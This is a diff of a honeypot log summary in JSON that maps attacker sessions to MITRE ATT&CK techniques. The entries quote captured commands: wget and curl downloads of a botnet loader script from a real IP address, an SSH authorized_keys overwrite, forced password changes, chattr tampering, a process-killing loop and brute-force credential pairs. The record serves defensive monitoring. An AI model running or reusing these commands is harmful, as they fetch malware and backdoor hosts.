@@ -1,28 +1,238 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-21 00:03:11",
+  "generated": "2026-09-21 01:03:11",
   "totals": {
-    "commands": 0,
-    "login_failed": 4,
-    "login_success": 0,
-    "sessions": 4
+    "commands": 55,
+    "login_failed": 85,
+    "login_success": 9,
+    "sessions": 124
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4,
+      "count": 85,
       "examples": [
         "root / 654321",
         "scout / scout",
         "user2 / monkey",
-        "user / 1qq2w3e4r5t"
+        "user / 1qq2w3e4r5t",
+        "user / 11q2w3e4r5t"
       ],
       "first": "2026-09-21T00:00:00.681036Z",
-      "last": "2026-09-21T00:02:20.899927Z",
+      "last": "2026-09-21T01:02:18.261032Z",
+      "unique_ips": 16
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "count": 18,
+      "examples": [
+        "cat /proc/cpuinfo | grep name | wc -l",
+        "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+        "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+        "uname -m",
+        "cat /proc/cpuinfo | grep model | grep name | wc -l"
+      ],
+      "first": "2026-09-21T00:43:34.288062Z",
+      "last": "2026-09-21T00:44:00.246382Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 12,
+      "examples": [
+        "cd /tmp;rm -rf wget.sh; wget http://58.211.144.243:800/wget.sh; busybox wget http://58.211.144.243:800/wget.sh; curl -O ",
+        "http://58.211.144.243:800/wget.sh",
+        "#!/bin/sh\ngroup=$1\nserver=\"58.211.144.243:800\"\nbins=\"arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i48",
+        "http://58.211.144.243:800/arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i486 m68k powerpc x86_64",
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
+      ],
+      "first": "2026-09-21T00:19:23.495089Z",
+      "last": "2026-09-21T00:52:41.841612Z",
+      "unique_ips": 4
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 9,
+      "examples": [
+        "root / root",
+        "root / vizxv",
+        "enable\\x00 / linuxshell\\x00",
+        "admin / 000",
+        "zhangc / zhangc123"
+      ],
+      "first": "2026-09-21T00:19:23.395124Z",
+      "last": "2026-09-21T00:59:07.767357Z",
+      "unique_ips": 8
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 6,
+      "examples": [
+        "#!/bin/sh\ngroup=$1\nserver=\"58.211.144.243:800\"\nbins=\"arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i48",
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
+      ],
+      "first": "2026-09-21T00:19:31.058459Z",
+      "last": "2026-09-21T00:52:24.858485Z",
+      "unique_ips": 4
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 4,
+      "examples": [
+        "w",
+        "whoami"
+      ],
+      "first": "2026-09-21T00:43:44.912463Z",
+      "last": "2026-09-21T00:43:57.093647Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 4,
+      "examples": [
+        "crontab -l",
+        "top"
+      ],
+      "first": "2026-09-21T00:43:43.296762Z",
+      "last": "2026-09-21T00:43:52.299524Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "ls -lh $(which ls)",
+        "ls -l /tmp/.testfile 2>&1"
+      ],
+      "first": "2026-09-21T00:43:41.772688Z",
+      "last": "2026-09-21T00:52:23.679755Z",
       "unique_ips": 3
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 2,
+      "examples": [
+        "#!/bin/sh\ngroup=$1\nserver=\"58.211.144.243:800\"\nbins=\"arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i48",
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
+      ],
+      "first": "2026-09-21T00:19:31.058459Z",
+      "last": "2026-09-21T00:52:24.858485Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1098.004",
+      "name": "Account Manipulation: SSH Authorized Keys",
+      "tactic": "Persistence",
+      "count": 2,
+      "examples": [
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1"
+      ],
+      "first": "2026-09-21T00:43:26.999430Z",
+      "last": "2026-09-21T00:43:28.899278Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 2,
+      "examples": [
+        "#!/bin/sh\ngroup=$1\nserver=\"58.211.144.243:800\"\nbins=\"arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i48",
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
+      ],
+      "first": "2026-09-21T00:19:31.058459Z",
+      "last": "2026-09-21T00:52:24.858485Z",
+      "unique_ips": 2
     }
   ],
-  "unmapped": []
+  "unmapped": [
+    [
+      "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found",
+      3
+    ],
+    [
+      "system",
+      1
+    ],
+    [
+      "shell",
+      1
+    ],
+    [
+      "sh",
+      1
+    ],
+    [
+      "/bin/busybox UNSTABLE",
+      1
+    ],
+    [
+      "echo -e \"zhangc123\\nRr5UIHr4qEcO\\nRr5UIHr4qEcO\"|passwd|bash",
+      1
+    ],
+    [
+      "echo \"zhangc123\\nRr5UIHr4qEcO\\nRr5UIHr4qEcO\\n\"|passwd",
+      1
+    ],
+    [
+      "echo -e \"000\\n60jAVX1gJM2q\\n60jAVX1gJM2q\"|passwd|bash",
+      1
+    ],
+    [
+      "echo \"000\\n60jAVX1gJM2q\\n60jAVX1gJM2q\\n\"|passwd",
+      1
+    ],
+    [
+      "echo SHELL_TEST",
+      1
+    ],
+    [
+      "/bin/busybox TEST",
+      1
+    ],
+    [
+      "cat /proc",
+      1
+    ],
+    [
+      "./",
+      1
+    ],
+    [
+      "echo WRITABLE >/tmp/.testfile 2>&1",
+      1
+    ],
+    [
+      "rm -f /tmp/.testfile",
+      1
+    ],
+    [
+      "cd /tmp",
+      1
+    ],
+    [
+      "echo WGET_CHECK",
+      1
+    ]
+  ]
 }
